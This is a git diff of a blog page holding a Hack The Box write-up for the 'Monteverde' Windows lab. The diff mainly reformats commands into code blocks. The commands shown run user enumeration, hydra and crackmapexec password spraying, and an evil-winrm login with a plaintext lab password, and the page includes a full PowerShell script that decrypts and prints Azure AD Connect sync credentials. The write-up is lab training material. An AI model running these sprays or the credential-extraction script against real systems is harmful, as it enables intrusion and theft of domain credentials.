@@ -15,15 +15,15 @@
 <meta name="generator" content="Jekyll v4.2.2" />
 <meta property="og:title" content="HTB Writeup [Windows - Medium] - Monteverde" />
 <meta property="og:locale" content="en_US" />
-<link rel="canonical" href="https://omnisl4sh.github.io/2022/06/24/Monteverde.html" />
-<meta property="og:url" content="https://omnisl4sh.github.io/2022/06/24/Monteverde.html" />
+<link rel="canonical" href="http://localhost:4000/2022/06/24/Monteverde.html" />
+<meta property="og:url" content="http://localhost:4000/2022/06/24/Monteverde.html" />
 <meta property="og:site_name" content="OmniSl4sh’s Blog" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2022-06-24T00:00:00+02:00" />
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="HTB Writeup [Windows - Medium] - Monteverde" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-24T00:00:00+02:00","datePublished":"2022-06-24T00:00:00+02:00","headline":"HTB Writeup [Windows - Medium] - Monteverde","mainEntityOfPage":{"@type":"WebPage","@id":"https://omnisl4sh.github.io/2022/06/24/Monteverde.html"},"url":"https://omnisl4sh.github.io/2022/06/24/Monteverde.html"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-24T00:00:00+02:00","datePublished":"2022-06-24T00:00:00+02:00","headline":"HTB Writeup [Windows - Medium] - Monteverde","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/06/24/Monteverde.html"},"url":"http://localhost:4000/2022/06/24/Monteverde.html"}</script>
 <!-- End Jekyll SEO tag -->
 
     <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
@@ -43,7 +43,7 @@
     <div id="container">
       <div class="inner">
         <header>
-          <h1><a href="https://omnisl4sh.github.io/">OmniSl4sh's Blog</a></h1>
+          <h1><a href="http://localhost:4000/">OmniSl4sh's Blog</a></h1>
           <h2></h2>
         </header>
         <!--<<section id="downloads" class="clearfix">
@@ -124,7 +124,9 @@ Host script results:
 <h3 id="username-enumeration">Username Enumeration</h3>
 <p><em>Using a tool called</em> <code class="language-plaintext highlighter-rouge">enum4linux-ng</code>, we are able to get a list of usernames via <code class="language-plaintext highlighter-rouge">RPC</code>:</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">enum4linx-ng -A 10.10.10.172</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linx-ng <span class="nt">-A</span> 10.10.10.172
+</code></pre></div></div>
 
 <p><img src="/assets/Monteverde/enum4linux-ng-output.jpg" alt="enum4linux-ng-output" /></p>
 
@@ -147,7 +149,9 @@ Host script results:
 
 <p>So we try using the usernames themselves as passwords. We do so using <code class="language-plaintext highlighter-rouge">hydra</code> and we get a hit!</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">hydra -e s -L users.txt ldap3://10.10.10.172 -v</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-e</span> s <span class="nt">-L</span> users.txt ldap3://10.10.10.172 <span class="nt">-v</span>
+</code></pre></div></div>
 
 <p>where the <code class="language-plaintext highlighter-rouge">-e</code> flag with the <code class="language-plaintext highlighter-rouge">s</code> argument is the part instructing <code class="language-plaintext highlighter-rouge">hydra</code> to use the same entry for both username and password.</p>
 
@@ -158,7 +162,9 @@ Host script results:
 
 <p>This module does as the name suggests: it <em>recursively</em> spiders <strong>SMB</strong> shares and outputs the results in a temp folder.</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.10.172 -u SABatchJobs -p SABatchJobs -M spider_plus</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.172 <span class="nt">-u</span> SABatchJobs <span class="nt">-p</span> SABatchJobs <span class="nt">-M</span> spider_plus
+</code></pre></div></div>
 
 <p><img src="/assets/Monteverde/cme-spiderplus.jpg" alt="cme-spiderplus" /></p>
 
@@ -168,7 +174,9 @@ Host script results:
 
 <p>We connect to the share with <code class="language-plaintext highlighter-rouge">smbclient</code> and download the file to view its contents:</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">smbclient //10.10.10.172/users$ -U SABatchJobs</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //10.10.10.172/users<span class="nv">$ </span><span class="nt">-U</span> SABatchJobs
+</code></pre></div></div>
 
 <p>and we get a password!</p>
 
@@ -177,7 +185,9 @@ Host script results:
 <h3 id="shell-access-as-mhope">Shell Access as <code class="language-plaintext highlighter-rouge">mhope</code></h3>
 <p><em>After getting this password,</em> we immediately spray it over the domain users. We find that it’s valid and that we have <strong>WinRM</strong> access as well!</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">crackmapexec winrm 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.172 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span> <span class="nt">--continue-on-success</span>
+</code></pre></div></div>
 
 <p><strong>Note:</strong> we used the <code class="language-plaintext highlighter-rouge">--continue-on-success</code> to be able to take advantage of any password reuse.</p>
 
@@ -185,7 +195,9 @@ Host script results:
 
 <p>We login using <code class="language-plaintext highlighter-rouge">evil-winrm</code> to get a <strong>PowerShell</strong> session on the box:</p>
 
-<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'</code></p>
+<p><strong>Command:</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.172 <span class="nt">-u</span> mhope <span class="nt">-p</span> <span class="s1">'4n0therD4y@n0th3r$'</span>
+</code></pre></div></div>
 
 <p><img src="/assets/Monteverde/evil-winrm-access.jpg" alt="evil-winrm-access" /></p>
 
@@ -248,17 +260,18 @@ Host script results:
 
 <p>we take a look at the first 5 lines:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"AD Connect Sync Credential Extract POC (@_xpn_)</span><span class="se">`n</span><span class="s2">"</span><span class="w">
 
-$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
-$client.Open()
-$cmd = $client.CreateCommand()
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Open</span><span class="p">()</span><span class="w">
+</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
 
-</code></pre></div></div>
+</span></code></pre></div></div>
 
 <p>And start by running the part which defines how the script will connect to the database a.k.a the <strong>“connection string”</strong>.</p>
 
-<p><code class="language-plaintext highlighter-rouge">$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</code></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"</span><span class="w">
+</span></code></pre></div></div>
 
 <p>which runs okay. Because we’re not really taking any action here. Just initializing an object of the type “System.Data.SqlClient.SqlConnection”. Nothing more.</p>
 
@@ -295,65 +308,65 @@ $cmd = $client.CreateCommand()
   <li>Defining the connection string: we’re connecting to the <strong>ADSync DB</strong> on the <strong>local computer</strong> using <strong>Windows Authentication</strong></li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$connection_string = "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=true;"
-$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList $connection_string
-$client.Open()
-$cmd = $client.CreateCommand()
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$connection_string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Data Source=localhost;Initial Catalog=ADSync;Integrated Security=true;"</span><span class="w">
+</span><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new-object</span><span class="w"> </span><span class="nx">System.Data.SqlClient.SqlConnection</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="nv">$connection_string</span><span class="w">
+</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Open</span><span class="p">()</span><span class="w">
+</span><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
 
 <ol>
   <li>Querying for the important bits to do the decryption: <code class="language-plaintext highlighter-rouge">keyset_id</code>, <code class="language-plaintext highlighter-rouge">instance_id</code> and <code class="language-plaintext highlighter-rouge">entropy</code> from the <code class="language-plaintext highlighter-rouge">mms_server_configuration</code> table</li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
-$reader = $cmd.ExecuteReader()
-$reader.Read() | Out-Null
-$key_id = $reader.GetInt32(0)
-$instance_id = $reader.GetGuid(1)
-$entropy = $reader.GetGuid(2)
-$reader.Close()
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cmd</span><span class="o">.</span><span class="nf">CommandText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"</span><span class="w">
+</span><span class="nv">$reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">ExecuteReader</span><span class="p">()</span><span class="w">
+</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Read</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
+</span><span class="nv">$key_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetInt32</span><span class="p">(</span><span class="nx">0</span><span class="p">)</span><span class="w">
+</span><span class="nv">$instance_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetGuid</span><span class="p">(</span><span class="nx">1</span><span class="p">)</span><span class="w">
+</span><span class="nv">$entropy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetGuid</span><span class="p">(</span><span class="nx">2</span><span class="p">)</span><span class="w">
+</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
 
 <ol>
   <li>Obtaining the configuration items: <code class="language-plaintext highlighter-rouge">private_configuration_xml</code> and <code class="language-plaintext highlighter-rouge">encrypted_configuration</code> from the <code class="language-plaintext highlighter-rouge">mms_management_agent</code> table</li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cmd = $client.CreateCommand()
-$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
-$reader = $cmd.ExecuteReader()
-$reader.Read() | Out-Null
-$config = $reader.GetString(0)
-$crypted = $reader.GetString(1)
-$reader.Close()
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">CreateCommand</span><span class="p">()</span><span class="w">
+</span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">CommandText</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"</span><span class="w">
+</span><span class="nv">$reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$cmd</span><span class="o">.</span><span class="nf">ExecuteReader</span><span class="p">()</span><span class="w">
+</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Read</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-Null</span><span class="w">
+</span><span class="nv">$config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">0</span><span class="p">)</span><span class="w">
+</span><span class="nv">$crypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$reader</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nx">1</span><span class="p">)</span><span class="w">
+</span><span class="nv">$reader</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
 
 <ol>
   <li>Loading the <code class="language-plaintext highlighter-rouge">mcrypt.dll</code> into memory and carrying out the decryption using the keys extracted from <strong>Step #1</strong></li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
-$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
-$km.LoadKeySet($entropy, $instance_id, $key_id)
-$key = $null
-$km.GetActiveCredentialKey([ref]$key)
-$key2 = $null
-$km.GetKey(1, [ref]$key2)
-$decrypted = $null
-$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add-type</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="s1">'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'</span><span class="w">
+</span><span class="nv">$km</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager</span><span class="w">
+</span><span class="nv">$km</span><span class="o">.</span><span class="nf">LoadKeySet</span><span class="p">(</span><span class="nv">$entropy</span><span class="p">,</span><span class="w"> </span><span class="nv">$instance_id</span><span class="p">,</span><span class="w"> </span><span class="nv">$key_id</span><span class="p">)</span><span class="w">
+</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
+</span><span class="nv">$km</span><span class="o">.</span><span class="nf">GetActiveCredentialKey</span><span class="p">([</span><span class="n">ref</span><span class="p">]</span><span class="nv">$key</span><span class="p">)</span><span class="w">
+</span><span class="nv">$key2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
+</span><span class="nv">$km</span><span class="o">.</span><span class="nf">GetKey</span><span class="p">(</span><span class="nx">1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$key2</span><span class="p">)</span><span class="w">
+</span><span class="nv">$decrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">$null</span><span class="w">
+</span><span class="nv">$key2</span><span class="o">.</span><span class="nf">DecryptBase64ToString</span><span class="p">(</span><span class="nv">$crypted</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$decrypted</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
 
 <ol>
   <li>Selecting the domain, username and password from the XML-formatted output and printing them to the screen.</li>
 </ol>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$domain   = select-xml -Content $config    -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
-$username = select-xml -Content $config    -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
-$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$domain</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$config</span><span class="w">    </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//parameter[@name='forest-login-domain']"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Domain'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerXML</span><span class="p">}}</span><span class="w">
+</span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$config</span><span class="w">    </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//parameter[@name='forest-login-user']"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Username'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerXML</span><span class="p">}}</span><span class="w">
+</span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">select-xml</span><span class="w"> </span><span class="nt">-Content</span><span class="w"> </span><span class="nv">$decrypted</span><span class="w"> </span><span class="nt">-XPath</span><span class="w"> </span><span class="s2">"//attribute"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="p">@{</span><span class="nx">Name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Password'</span><span class="p">;</span><span class="w"> </span><span class="nx">Expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">node</span><span class="o">.</span><span class="nf">InnerText</span><span class="p">}}</span><span class="w">
 
-Write-Host ("Domain: "   + $domain.Domain)
-Write-Host ("Username: " + $username.Username)
-Write-Host ("Password: " + $password.Password)
-</code></pre></div></div>
+</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Domain: "</span><span class="w">   </span><span class="o">+</span><span class="w"> </span><span class="nv">$domain</span><span class="o">.</span><span class="nf">Domain</span><span class="p">)</span><span class="w">
+</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Username: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$username</span><span class="o">.</span><span class="nf">Username</span><span class="p">)</span><span class="w">
+</span><span class="n">Write-Host</span><span class="w"> </span><span class="p">(</span><span class="s2">"Password: "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$password</span><span class="o">.</span><span class="nf">Password</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
 
 <p><em>With everything in place,</em> we run the script and get a clean set of creds ;]</p>
 
